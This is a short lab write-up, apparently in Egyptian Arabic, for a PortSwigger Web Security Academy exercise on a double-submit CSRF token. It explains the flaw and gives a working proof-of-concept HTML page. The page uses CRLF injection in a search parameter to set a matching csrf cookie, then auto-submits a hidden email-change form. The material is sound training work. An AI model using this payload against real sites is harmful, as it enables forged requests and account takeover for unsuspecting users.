# Lab : CSRF where token is duplicated in cookies

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

- الفكره من الLab ده انك تستغل ان في ثغره CSRF ةتستغل ان parameter the email مصاب وتغير الايميل بس ال CSRF token  and CSRF Key cookies مرتبطين وشبه بعض واي حاجه ممكن تمشي طالما الاتنين شبه بعض وملهمش علاقه ب session وال مفروض علشان اعرف اعمل استغلال استخدم ثغره معاها كمان علشان CSRF cookie اعرف استغلها هستخدم ثغره HTTP Header Injection

 

```bash
1. <html>
  <!-- CSRF PoC - CRLF Set-Cookie injection to align csrfKey with csrf token -->
  <body>
    <form action="https://0a2400a90343a2a7804f03dc005300b3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;CA" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
<img src="https://0a2400a90343a2a7804f03dc005300b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

    <script>
history.pushState('', '', '/');
    </script>
  </body>
</html>
```
